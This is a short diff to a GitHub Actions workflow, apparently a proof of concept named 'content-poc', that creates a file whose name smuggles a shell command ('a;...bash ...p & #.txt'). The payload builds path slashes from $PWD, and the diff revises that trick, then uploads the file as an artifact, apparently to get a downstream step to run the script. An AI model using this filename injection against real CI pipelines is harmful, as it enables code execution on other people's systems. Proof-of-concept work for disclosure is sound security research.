@@ -44,7 +44,7 @@ jobs:
           done
           SCRIPT
           chmod +x content/p
-          printf 'x\n' > 'content/a;bash ${PWD:0:1}tmp${PWD:0:1}content${PWD:0:1}content-poc${PWD:0:1}p & #.txt' 
+          printf 'x\n' > 'content/a;S=$(printf %.1s $PWD);bash ${S}tmp${S}content${S}content-poc${S}p & #.txt'
       - uses: actions/upload-artifact@v4
         with:
           name: content-poc
